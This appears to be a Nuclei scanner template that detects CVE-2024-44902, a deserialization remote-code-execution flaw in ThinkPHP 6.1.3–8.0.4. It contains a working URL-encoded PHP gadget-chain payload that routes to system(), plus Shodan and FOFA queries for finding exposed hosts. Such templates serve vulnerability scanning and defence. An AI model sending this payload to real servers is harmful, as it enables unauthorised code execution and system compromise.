id: CVE-2024-44902

info:
  name: ThinkPHP 6.1.3-8.0.4 - Insecure Deserialization RCE
  author: KrE80r
  severity: critical
  description: |
    A deserialization vulnerability in ThinkPHP versions 6.1.3 to 8.0.4 allows remote attackers to execute arbitrary code when the Memcached PHP extension is installed.
    The vulnerability exploits a gadget chain through ThinkPHP's internal classes (ResourceRegister → DbManager → Memcached → Pivot → Model) where the Model destructor processes withAttr callbacks during deserialization, enabling code execution via system() calls.
  impact: |
    Successful exploitation allows attackers to:
    - Execute arbitrary code remotely
    - Achieve complete system compromise
    - Exfiltrate sensitive data
    - Establish persistence and lateral movement
  remediation: Upgrade to a patched version of ThinkPHP when available, or implement input validation to prevent unserialization of untrusted data.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-44902
    - https://github.com/advisories/GHSA-f4wh-359g-4pq7
    - https://advisories.gitlab.com/pkg/composer/topthink/framework/CVE-2024-44902/
    - https://github.com/fru1ts/CVE-2024-44902
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-44902
    cwe-id: CWE-502
    epss-score: 0.94307
    epss-percentile: 0.99939
    cpe: cpe:2.3:a:thinkphp:thinkphp:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: thinkphp
    product: thinkphp
    shodan-query: 'http.title:"thinkphp"'
    fofa-query: 'app="ThinkPHP"'
  tags: cve,cve2024,thinkphp,deserialization,rce,critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/?data={{payload}}"

    payloads:
      payload:
        - 'O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A28%3A%22think%5Ccache%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A4%3A%22test%22%3B%7Ds%3A7%3A%22%00%2A%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A11%3A%22%00%2A%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%7D%7D'

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "think\\route\\ResourceRegister"
          - "think\\cache\\driver\\Memcached"
          - "think\\model\\Pivot"
        condition: and

      - type: word
        part: body
        words:
          - "Fatal error"
          - "call_user_func_array"
          - "__destruct"
        condition: or

      - type: status
        status:
          - 200
